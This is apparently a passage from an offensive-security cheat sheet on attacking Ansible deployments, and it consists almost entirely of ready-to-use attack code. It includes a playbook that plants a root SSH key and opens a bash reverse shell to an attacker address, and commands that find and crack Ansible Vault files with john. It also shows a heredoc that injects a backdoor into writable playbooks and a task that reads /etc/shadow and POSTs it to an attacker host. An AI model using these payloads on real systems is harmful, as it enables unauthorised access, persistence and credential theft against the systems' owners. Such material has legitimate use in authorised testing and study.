---
tags:
  - Ansible
  - Exploitation
  - Foundational
  - Lateral_Movement
  - Linux
---
- name: Backdoor
  hosts: all
  tasks:
    - name: Add SSH key
      authorized_key:
        user: root
        key: "<PublicKey>"
        state: present

    - name: Reverse shell
      shell: "bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &"
      async: 10
      poll: 0
```

### Run Malicious Playbook [Remote]
```bash
ansible-playbook backdoor.yml
```

## Credential Extraction

### Find Ansible Vault Files [Remote]
```bash
find / -name "*.vault" -o -name "vault.yml" 2>/dev/null
grep -r "ANSIBLE_VAULT" / 2>/dev/null
```

### Crack Ansible Vault [Local]
```bash
ansible2john vault.yml > vault.hash
john --wordlist=/usr/share/wordlists/rockyou.txt vault.hash
```

### Decrypt Vault [Remote]
```bash
ansible-vault decrypt vault.yml --ask-vault-pass
ansible-vault view vault.yml --ask-vault-pass
```

### Find Plaintext Credentials [Remote]
```bash
grep -r "password" /etc/ansible/ 2>/dev/null
grep -r "ansible_ssh_pass" /etc/ansible/ 2>/dev/null
```

## Weak Permissions Exploitation

### Check Playbook Permissions [Remote]
```bash
ls -la /etc/ansible/playbooks/
find /etc/ansible -writable 2>/dev/null
```

### Modify Existing Playbook [Remote]
```bash
# If playbook is writable, add malicious task
cat >> /path/to/playbook.yml << 'EOF'
    - name: Backdoor
      shell: "echo '<PublicKey>' >> /root/.ssh/authorized_keys"
EOF
```

### Wait for Scheduled Execution
> [!tip] Playbooks often run on schedule via cron or CI/CD.

## Data Leakage via Modules

### Debug Module Leaks [Remote]
```yaml
- name: Leak secrets
  debug:
    var: ansible_ssh_pass
```

### Register and Exfiltrate [Remote]
```yaml
- name: Get secrets
  shell: "cat /etc/shadow"
  register: shadow_contents

- name: Exfiltrate
  uri:
    url: "http://<AttackerIP>/log"
    method: POST
    body: "{{ shadow_contents.stdout }}"
```
